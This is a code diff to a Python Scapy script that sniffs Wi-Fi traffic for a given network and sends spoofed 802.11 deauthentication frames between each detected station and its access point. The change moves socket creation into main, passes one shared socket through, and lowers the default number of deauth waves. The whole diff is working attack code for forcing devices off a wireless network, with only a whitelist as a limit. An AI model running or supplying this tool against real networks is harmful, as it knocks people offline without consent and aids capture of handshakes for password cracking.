@@ -110,14 +110,13 @@ def register_sta(wifi_essid, bssid_sta, bssid_ap, bssids_stas_dict):
     except Exception as e:
         raise MsgException(e, 'Detected station could not be registered')
 
-def unicast_deauth(wifi_interface, deauth_waves, bssid_sta, bssid_ap, bssid_network):
+def unicast_deauth(deauth_waves, deauth_socket, bssid_sta, bssid_ap, bssid_network):
     '''unicast deauthentication'''
     
     try:
         print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from AP {bssid_ap} to STA {bssid_sta} ...')
         print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from STA {bssid_sta} to AP {bssid_ap} ...')
         for i in range(deauth_waves):
-            deauth_socket = scapy_conf.L2socket(iface = wifi_interface)
             for i in range(DEAUTH_COUNT):
                 deauth_socket.send(
                     dot11.RadioTap() /
@@ -130,11 +129,10 @@ def unicast_deauth(wifi_interface, deauth_waves, bssid_sta, bssid_ap, bssid_netw
                     dot11.Dot11(addr1 = bssid_ap, addr2 = bssid_sta, addr3 = bssid_network) /
                     dot11.Dot11Deauth(reason = 7)
                 )
-            deauth_socket.close()
     except Exception as e:
         raise MsgException(e, 'Deauthentication frames could not be sent')
 
-def sniffer_wrapper(wifi_interface, wifi_essid, bssids_whitelist, deauth_waves, bssids_aps_dict, bssids_stas_dict):
+def sniffer_wrapper(wifi_essid, bssids_whitelist, deauth_waves, deauth_socket, bssids_aps_dict, bssids_stas_dict):
     def sniffer_handler(frame):
         '''sniffed frame processing'''
         
@@ -168,10 +166,10 @@ def sniffer_wrapper(wifi_interface, wifi_essid, bssids_whitelist, deauth_waves, 
                 else:
                     if bssids_aps_dict.get(bssid_src) and (bssids_stas_dict.get(bssid_dst) != bssid_src) and is_unicast(bssid_dst):
                         register_sta(wifi_essid, bssid_dst, bssid_src, bssids_stas_dict)
-                        unicast_deauth(wifi_interface, deauth_waves, bssid_dst, bssid_src, bssid_network)
+                        unicast_deauth(deauth_waves, deauth_socket, bssid_dst, bssid_src, bssid_network)
                     elif bssids_aps_dict.get(bssid_dst) and (bssids_stas_dict.get(bssid_src) != bssid_dst):
                         register_sta(wifi_essid, bssid_src, bssid_dst, bssids_stas_dict)
-                        unicast_deauth(wifi_interface, deauth_waves, bssid_src, bssid_dst, bssid_network)
+                        unicast_deauth(deauth_waves, deauth_socket, bssid_src, bssid_dst, bssid_network)
         
         except Exception as e:
             raise MsgException(e, 'Sniffed frames could not be processed')
@@ -208,11 +206,12 @@ def main():
             help = 'Number of deauthentication waves',
             required = False,
             type = int,
-            default = 8,
+            default = 1,
         )
         args = parser.parse_args()
         bssids_aps_dict = {} # {ap bssid: network bssid}
         bssids_stas_dict = {} # {sta bssid: ap bssid}
+        deauth_socket = scapy_conf.L2socket(iface = args.wifi_interface)
         scapy_sniff(
             iface = args.wifi_interface,
             filter =
@@ -222,10 +221,10 @@ def main():
                 BPF_DOT11_CONTROL + ' or ' +
                 BPF_DOT11_DATA,
             prn = sniffer_wrapper(
-                args.wifi_interface,
                 args.wifi_essid,
                 args.bssids_whitelist,
                 args.deauth_waves,
+                deauth_socket,
                 bssids_aps_dict,
                 bssids_stas_dict,
             ),
@@ -234,6 +233,11 @@ def main():
         panic(msg_exception)
     except Exception as e:
         panic(MsgException(e))
+    finally:
+        try:
+            deauth_socket.close()
+        except:
+            sys.exit(-1)
 
 if __name__ == '__main__':
     main()
